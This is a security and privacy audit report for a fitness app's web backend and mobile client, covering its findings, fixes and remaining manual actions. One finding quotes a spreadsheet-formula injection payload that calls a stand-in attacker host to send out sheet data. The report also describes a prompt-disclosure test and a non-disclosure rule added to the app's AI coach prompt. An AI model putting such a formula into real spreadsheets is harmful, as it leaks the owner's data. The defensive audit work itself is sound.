# Hybrid — Security & Privacy Audit

Scope: the Next.js backend/marketing site (`Hybrid/`) and the Expo mobile client (`HybridApp/`). This was a security-and-privacy pass only — no training, workout, or nutrition **behavior** was changed (the one nutrition-adjacent change is a security fix: input caps on the AI nutrition prompt).

**Honest disclaimer:** this audit found and fixed the issues below and tested the fixes, but no application is ever "100% secure." Residual risks and required manual actions are listed at the end.

---

## Architecture (what was tested)

- **Auth/DB:** Supabase (hosted). The mobile app talks to Supabase directly with the **anon** key; Row Level Security is the real access boundary. Session tokens live in the iOS Keychain / Android Keystore via `expo-secure-store` (chunked) — not in plaintext AsyncStorage.
- **Server:** Next.js API routes on Vercel. Two groups: (a) **authenticated** AI/Strava endpoints (`/api/chat`, `/api/generate-plan`, `/api/generate-nutrition`, `/api/strava/*`) that require a Supabase bearer token via `lib/verifyUser.ts`; (b) **public** lead-gen endpoints (`/api/waitlist`, `/api/plan`, `/api/feedback`, `/api/chat-demo`) for the marketing site.
- **Secrets:** all private keys (Anthropic, Google service account, Gmail app password, Strava client secret) are server-only env vars. `.env*` and the PII data files (`plans.json`, `feedback.json`, `waitlist.json`) are gitignored and **were never committed** (verified against full git history of both repos).
- **No SQL, no `dangerouslySetInnerHTML`, no file uploads, no client-trusted `userId`** anywhere — verified by grep across both repos.

---

## Findings

### CRITICAL
None found that were live-exploitable. The closest was the fail-open auth gate (below), rated HIGH because it only triggers on a specific misconfiguration.

### HIGH

**H1 — Fail-OPEN authentication gate.** `lib/verifyUser.ts` returned `{ ok: true }` (allowing the request) whenever `SUPABASE_URL`/`SUPABASE_ANON_KEY` were unset. A production deploy missing those vars would expose every authenticated endpoint — AI spend and the Strava token exchange — to anonymous callers.
- *Fix:* fail **closed** in production (`NODE_ENV === "production"` → reject when unconfigured). Dev open-mode preserved for local work. Tested both paths.

**H2 — Public lead-gen endpoints had no rate limiting.** `/api/waitlist`, `/api/plan`, `/api/feedback` each send email and write to Google Sheets, unauthenticated and unthrottled — an easy inbox-bomb / sheet-flood / cost vector.
- *Fix:* per-IP sliding-window limit (5 requests / 10 min) as the first line of each handler. Verified live (6th request → 429).

**H3 — Dependency vulnerabilities.** `nodemailer ≤9.0.0` (arbitrary file read / SSRF via raw message option, GHSA-p6gq-j5cr-w38f) in the web repo; several DoS-class advisories (`brace-expansion`, `shell-quote`, `postcss`) in both.
- *Fix:* upgraded `nodemailer` → 9.0.3, `next` → 16.2.11, and ran non-breaking `npm audit fix` in both repos. Remaining items are transitive and non-exploitable here (see residual risks).

### MEDIUM

**M1 — AI endpoints accepted unbounded input.** `/api/chat*` accepted any `messages` array (including Anthropic **content-block arrays** — an image-token cost hole) and the generate-plan/nutrition routes interpolated arbitrary-length client fields straight into the prompt. Real API-cost-abuse surface.
- *Fix:* `sanitizeChatMessages` (plain-text user/assistant turns only, ≤10 messages, ≤4000 chars each, must end on a user turn) and `capString` length caps on every generate-* field.

**M2 — Internal error detail leaked to clients.** Every route returned `error: e.message` on 500 — Anthropic/Google/Postgres error strings surfaced to the browser.
- *Fix:* all 9 routes now log detail server-side and return a generic "Something went wrong. Please try again." Verified: 9/9 routes leak nothing.

**M3 — Google Sheets formula injection.** Form fields were written with `valueInputOption: "USER_ENTERED"`, so a value like `=IMPORTXML("http://attacker/?"&A1,"//a")` would execute as a live formula in the owner's sheet (data exfiltration when the sheet is opened).
- *Fix:* switched to `valueInputOption: "RAW"` **and** prefix-escape formula-leading values (`sheetSafe`).

**M4 — Notification-email HTML injection.** User-supplied form values were interpolated raw into the notification email HTML — a malicious link/markup would render in the founder's inbox. Email subject also used raw email (header-injection shape).
- *Fix:* `escapeHtml` on all interpolated values; CR/LF stripped from subject lines.

**M5 — Missing security headers.** No `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, or HSTS.
- *Fix:* added all five in `next.config.ts` for every route. Verified live on responses.

**M6 — Account deletion left device data behind.** The server delete-account function runs, but the app kept every per-uid local record (plan, nutrition, profile, workouts, adjustments) and the Strava keychain tokens on the device — a privacy gap on a shared/resold phone.
- *Fix:* on successful deletion the app now purges all `hybrid:*:{uid}` AsyncStorage keys and clears Strava tokens.

### LOW

- **L1 — PII in server logs.** `/api/waitlist` logged signup emails (`console.log(email)`). *Fixed* — removed email from logs.
- **L2 — AI prompt-injection hardening.** The coach's system prompt didn't explicitly forbid revealing its instructions or implying access to other users. *Fixed* — added an explicit non-disclosure + "you only ever have this athlete's context" instruction. (The real guarantee is architectural: the endpoint only ever receives the signed-in athlete's own compact context — see below.)
- **L3 — Timing of dev-mode note:** the Supabase anon key is intentionally public (documented in `reset-password/page.tsx`); confirmed it is the **anon** role, not service-role. No action needed beyond the note.

---

## Cross-user data access (the top priority) — assessment

The brief's #1 concern is IDOR / cross-user access. Findings:

- **No endpoint trusts a client-supplied user ID.** Grep confirms zero `body.userId`-style reads. The authenticated routes derive identity from the verified Supabase token; the AI routes don't do per-resource lookups at all (they generate from the posted profile).
- **The app reads/writes user data directly against Supabase**, so cross-user protection is **entirely dependent on Row Level Security policies** in the Supabase project. Those policies live in the hosted Supabase dashboard, **not in this repo**, so I could not audit or fix them from the code. **This is the single most important manual action** — see below.
- **AI context minimization:** `app/(tabs)/chat.tsx` `buildContext()` sends only a compact, structured summary of the *signed-in* athlete's own plan (goal, week/phase, today's session, upcoming, recent RPE, fuel estimate, injuries) — capped server-side to 2000 chars. It does not send lifetime history or any other user's data. Good.

---

## Attack scenarios tested

| # | Scenario | Result |
|---|---|---|
| 1 | Logged-out access to authenticated endpoint (prod) | Rejected (fail-closed) ✓ |
| 4 | Script injected into a form field → notification email / sheet | Rendered inert (escaped / RAW+prefixed) ✓ |
| 5 | Rapid repeat requests to a public endpoint | 429 after limit ✓ (live) |
| 6 | Client sends its own `userId` | No route reads it ✓ |
| 8 | AI asked to reveal prompt / other users' data | Only own context sent; non-disclosure instruction added ✓ |
| 9/10 | Private API key in network traffic / client bundle | None — client uses only public Supabase/Strava values ✓ |
| — | Malformed / oversized / content-block AI payload | 400 / capped ✓ (unit + live) |
| — | Sheets formula injection | Neutralized ✓ |

Tests **2, 3, 7** (User A reads/deletes User B's plan/meal/workout) are **RLS-enforced in Supabase** and must be verified in the dashboard — I could not exercise them from code (see manual actions).

---

## Automated security tests added

`scratchpad/security-test.ts` (19 checks, all passing): fail-closed vs dev-open auth, chat sanitization (role whitelist, content-block rejection, size/count caps, user-terminated transcript), HTML escaping, Sheets formula neutralization, input caps + control-char stripping, and rate-limiter mechanics. Plus live `curl` verification of headers, 400s, 429s, and generic errors against a running dev server.

---

## Summary of changes

- **Endpoints protected/hardened:** `chat`, `chat-demo`, `generate-plan`, `generate-nutrition`, `plan`, `feedback`, `waitlist`, `strava/exchange`, `strava/activities` (all 9).
- **Rate limits added:** waitlist / plan / feedback (5 per 10 min per IP). (chat 30/hr, generate 8/min, demo 10/10min already existed.)
- **Auth:** now fails closed in production.
- **Dependencies upgraded:** nodemailer 8→9.0.3, next 16.2.6→16.2.11, + `npm audit fix` (both repos).
- **Headers:** 5 security headers site-wide.
- **Privacy:** account deletion purges on-device data; PII removed from logs; AI context confirmed minimal.
- **New shared helpers:** `lib/verifyUser.ts` — `sanitizeChatMessages`, `capString`, `escapeHtml`, `sheetSafe`.

## Credentials to rotate
**None strictly required** — no secret was found committed to git or shipped in a client bundle. As routine hygiene, rotate the Anthropic key and Gmail app password if they have ever been shared outside Vercel's env store. The Supabase **anon** key is public by design (do not treat it as a secret); ensure the **service-role** key has never been placed in any client or committed file (it is not, in this codebase).

## Still requires manual action (cannot be done from this repo)
1. **Verify Supabase RLS** on every user table (profiles, plans, workouts, workout_logs, nutrition, meal_plans, conversations, feedback, overrides): RLS **enabled**, and policies restricting SELECT/INSERT/UPDATE/DELETE to `auth.uid() = user_id`. This is the actual cross-user boundary and lives only in the Supabase dashboard.
2. **Confirm the `delete-account` Edge Function** deletes the auth user **and** all their rows across every table (not just the profile).
3. **Confirm the service-role key** is only in Supabase Edge Function / Vercel server env — never in the app or web client.
4. **Consider a shared-store rate limiter** (e.g. Upstash Redis): the current in-memory limiter is per-serverless-instance, so it blunts bursts but isn't a hard global cap at scale.
5. **Content-Security-Policy** was intentionally not added (a blind CSP breaks Next's inline runtime) — add it with nonces as a follow-up.
6. **Residual `npm audit`:** `sharp`/`postcss` (web, transitive via next's optional image tooling) and `uuid` (app, transitive via Expo tooling) remain flagged; none are on a reachable exploit path here. Revisit when next/Expo ship patched transitives — do not force-downgrade `next`.
